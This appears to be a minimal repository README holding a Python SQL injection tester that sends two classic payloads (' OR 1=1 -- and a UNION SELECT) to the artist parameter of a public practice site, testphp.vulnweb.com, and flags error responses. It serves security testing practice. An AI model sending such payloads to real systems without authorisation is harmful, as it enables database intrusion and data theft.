# JExploit-SQLi-SQL-Injection-Tester-
Task: Test artists.php?artist=1 for SQLi (from your report).
import requests

url = "http://testphp.vulnweb.com/artists.php"
payloads = ["' OR 1=1 --", "' UNION SELECT 1,2,3 --"]

for payload in payloads:
    params = {"artist": payload}
    response = requests.get(url, params=params)
    if "error" in response.text.lower():
        print(f"[!] SQLi Vulnerable: {payload}")
